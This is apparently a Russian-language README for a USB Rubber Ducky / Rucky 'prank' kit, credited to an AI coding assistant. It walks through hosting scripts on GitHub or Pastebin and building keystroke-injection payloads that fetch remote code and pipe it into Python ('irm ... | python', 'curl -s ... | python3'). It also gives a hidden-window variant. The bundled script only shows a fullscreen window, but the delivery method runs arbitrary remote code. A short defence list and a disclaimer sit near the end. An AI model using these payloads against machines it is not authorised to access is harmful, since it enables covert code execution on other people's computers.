# 🎯 HID АТАКА - Китайская атака через USB Rubber Ducky / Rucky

## 📋 Что это?

Standalone версия китайской атаки для запуска через HID устройства (USB Rubber Ducky, Rucky, BadUSB).
Скрипт загружается с GitHub/Pastebin и запускается локально на целевой машине.

---

## 📁 Файлы

### Скрипты для целевых машин:
- `chinese_attack_windows.py` - Windows версия (PowerShell + Windows Forms)
- `chinese_attack_linux.py` - Linux версия (Python + tkinter)

### HID Payloads:
- `hid_windows.txt` - Payload для Windows (Rubber Ducky script)
- `hid_linux.txt` - Payload для Linux (Rubber Ducky script)

---

## 🚀 БЫСТРЫЙ СТАРТ

### Шаг 1: Загрузи скрипты на GitHub или Pastebin

#### Вариант A: GitHub (рекомендуется)

1. Создай репозиторий на GitHub
2. Загрузи файлы:
   - `payloads/chinese_attack_windows.py`
   - `payloads/chinese_attack_linux.py`
3. Получи raw ссылки:
   ```
   https://raw.githubusercontent.com/YOUR_USERNAME/REPO_NAME/main/payloads/chinese_attack_windows.py
   https://raw.githubusercontent.com/YOUR_USERNAME/REPO_NAME/main/payloads/chinese_attack_linux.py
   ```

#### Вариант B: Pastebin

1. Зайди на https://pastebin.com
2. Вставь содержимое `chinese_attack_windows.py`
3. Создай paste и получи raw ссылку:
   ```
   https://pastebin.com/raw/YOUR_PASTE_ID
   ```

---

### Шаг 2: Обнови HID payload

Открой `hid_windows.txt` или `hid_linux.txt` и замени:
```
YOUR_USERNAME -> твой GitHub username
YOUR_PASTE_ID -> твой Pastebin ID
```

**Пример для Windows:**
```
STRING irm https://raw.githubusercontent.com/k1laure/hamster_prank/main/payloads/chinese_attack_windows.py | python
```

**Пример для Linux:**
```
STRING curl -s https://raw.githubusercontent.com/k1laure/hamster_prank/main/payloads/chinese_attack_linux.py | python3
```

---

### Шаг 3: Загрузи payload на USB Rubber Ducky / Rucky

#### Для USB Rubber Ducky:
1. Скопируй содержимое `hid_windows.txt` или `hid_linux.txt`
2. Сохрани как `payload.txt` на SD карту Rubber Ducky
3. Вставь Rubber Ducky в целевую машину

#### Для Rucky (Android):
1. Открой приложение Rucky
2. Создай новый payload
3. Вставь содержимое `hid_windows.txt` или `hid_linux.txt`
4. Подключи телефон к целевой машине через USB
5. Запусти payload

---

## 🎯 КАК ЭТО РАБОТАЕТ

### Windows:
1. HID устройство эмулирует клавиатуру
2. Открывает PowerShell (Win+R → powershell)
3. Загружает скрипт с GitHub/Pastebin через `Invoke-RestMethod`
4. Запускает Python скрипт
5. Появляется полноэкранное окно с китайскими символами
6. Окно закрывается через 15 секунд (или по ESC/Q)

### Linux:
1. HID устройство эмулирует клавиатуру
2. Открывает терминал (Ctrl+Alt+T)
3. Загружает скрипт с GitHub/Pastebin через `curl`
4. Запускает Python скрипт
5. Появляется полноэкранное окно с китайскими символами
6. Окно закрывается через 15 секунд (или по ESC/Q)

---

## ⚙️ НАСТРОЙКИ

### Изменить длительность атаки:

**Windows payload:**
```
STRING irm https://raw.githubusercontent.com/.../chinese_attack_windows.py | python - 30
```
(30 секунд вместо 15)

**Linux payload:**
```
STRING curl -s https://raw.githubusercontent.com/.../chinese_attack_linux.py | python3 - 30
```

### Скрытый запуск (без видимого окна PowerShell/Terminal):

**Windows:**
```
STRING powershell -WindowStyle Hidden -Command "irm https://... | python"
```

**Linux:**
```
STRING curl -s https://... | python3 & disown
```

---

## 🔧 ТРЕБОВАНИЯ

### На целевой машине должно быть установлено:

**Windows:**
- ✅ Python 3.x (в PATH)
- ✅ PowerShell 5.1+ (встроен в Windows 10/11)
- ✅ Интернет соединение

**Linux:**
- ✅ Python 3.x
- ✅ tkinter (`sudo apt install python3-tk`)
- ✅ curl
- ✅ Интернет соединение

---

## 🎭 ПРИМЕРЫ ИСПОЛЬЗОВАНИЯ

### Пример 1: Быстрая атака на Windows
```
1. Загрузи chinese_attack_windows.py на GitHub
2. Обнови hid_windows.txt с правильной ссылкой
3. Загрузи payload на Rubber Ducky
4. Вставь в целевую Windows машину
5. Через 2-3 секунды появится полноэкранное окно!
```

### Пример 2: Атака на Linux (Kali)
```
1. Загрузи chinese_attack_linux.py на Pastebin
2. Обнови hid_linux.txt с Pastebin ссылкой
3. Используй Rucky на Android
4. Подключи к Kali Linux
5. Запусти payload
6. Полноэкранное окно с китайскими символами!
```

---

## 🛡️ ЗАЩИТА

Как защититься от такой атаки:
1. Отключить автозапуск USB устройств
2. Блокировать неизвестные HID устройства
3. Использовать USB Guard (Linux)
4. Отключить PowerShell для обычных пользователей (Windows)
5. Блокировать доступ к GitHub/Pastebin через firewall

---

## ⚠️ DISCLAIMER

**ТОЛЬКО ДЛЯ ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЕЙ!**

- Используй только на своих машинах или с разрешения владельца
- Не используй для вредоносных действий
- Автор не несет ответственности за неправомерное использование

---

## 📊 СТАТИСТИКА

**Время выполнения:** 2-5 секунд  
**Длительность атаки:** 15 секунд (настраивается)  
**Размер payload:** ~200 байт  
**Требуется интернет:** Да (для загрузки скрипта)

---

## 🔗 ССЫЛКИ

- USB Rubber Ducky: https://shop.hak5.org/products/usb-rubber-ducky
- Rucky (Android): https://github.com/mayankmetha/Rucky
- Ducky Script: https://docs.hak5.org/hak5-usb-rubber-ducky/ducky-script-basics

---

**Дата создания:** 2026-04-09  
**Версия:** 1.0  
**Автор:** OpenCode AI Assistant

🎭 Удачных пранков!
